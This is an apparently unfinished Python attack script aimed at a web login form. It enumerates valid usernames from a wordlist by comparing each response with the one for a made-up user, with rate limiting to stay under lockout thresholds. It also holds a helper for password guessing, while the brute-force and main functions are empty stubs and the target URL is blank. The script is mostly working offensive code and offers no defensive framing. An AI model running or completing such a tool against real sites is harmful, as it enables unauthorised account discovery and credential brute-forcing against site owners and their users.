from ratelimit import limits, RateLimitException, sleep_and_retry
from requests import post
from pathlib import Path

ONE_MINUTE = 60
MAX_CALLS_PER_MINUTE = 120

url = ''
headers = {

}
cookies = {

}

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_user_call(url, user, headers, cookies):
    return post(
        url, 
        data={'username': user, 'password': 'asdf'},
        headers=headers,
        cookies=cookies
    )

def enumerate_user(url, user_file_list, headers, cookies):
    demarcation_response = post(
        url,
        data={'username': 'obviously_non_existent_user', 'password': 'pass'},
        headers=headers,
        cookies=cookies
    )
    users = []
    with Path(user_file_list).open('r') as file:
        for user in file.readlines():
            res = make_user_call(url, user, headers, cookies)
            if demarcation_response.text != res.text:
                users.append(user)
    return users

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_pass_call(url, user, password, headers, cookies):
    return post(
        url,
        data={'username': user, 'password': password},
        headers=headers,
        cookies=cookies
    )

def password_user(url, user, password_file_list, headers, cookies):
    pass

def main():
    pass

if __name__ == '__main__':
    main()